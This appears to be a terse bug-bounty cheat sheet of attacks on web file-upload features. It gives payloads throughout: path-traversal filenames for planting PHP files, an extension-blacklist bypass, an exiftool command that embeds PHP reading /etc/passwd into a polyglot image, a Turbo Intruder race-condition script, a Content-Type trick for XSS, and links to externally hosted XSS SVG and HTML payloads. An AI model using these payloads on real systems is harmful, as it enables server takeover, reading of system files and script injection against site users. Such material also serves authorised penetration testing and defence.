# Upload Files

## Directory Traversal
```http
Content-Disposition: form-data; name="avatar"; filename="../exploit.php"
Content-Disposition: form-data; name="avatar"; filename="..%2exploit.php"
```
## Content-Type
Content-Type to image/jpeg.

## Extension blacklist bypass

```http
Content-Disposition: form-data; name="avatar"; filename="exploit.php"
```

## Metadata
```bash
exiftool -Comment="<?php echo 'START ' . file_get_contents('/etc/passwd') . ' END'; ?>" example.jpg -o polyglot.php
```
## Race condition

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=10,)

    request1 = '''<YOUR-POST-REQUEST>'''

    request2 = '''<YOUR-GET-REQUEST>'''

    # the 'gate' argument blocks the final byte of each request until openGate is invoked
    engine.queue(request1, gate='race1')
    for x in range(5):
        engine.queue(request2, gate='race1')

    # wait until every 'race1' tagged request is ready
    # then send the final byte of each request
    # (this method is non-blocking, just like queue)
    engine.openGate('race1')

    engine.complete(timeout=60)


def handleResponse(req, interesting):
    table.add(req)
```

## Test metadata
Upload xss_comment_exif_metadata_double_quote.png
```http
Con`tent-Type:image/png - Content-Type: text/html
```
##### Reference: https://hackerone.com/reports/964550

## If is possible to change src=
Add urls:
* https://angeljuanma.github.io/bug-bounty/evil.svg
* https://angeljuanma.github.io/bug-bounty/xss.svg
* https://angeljuanma.github.io/bug-bounty/xss.html

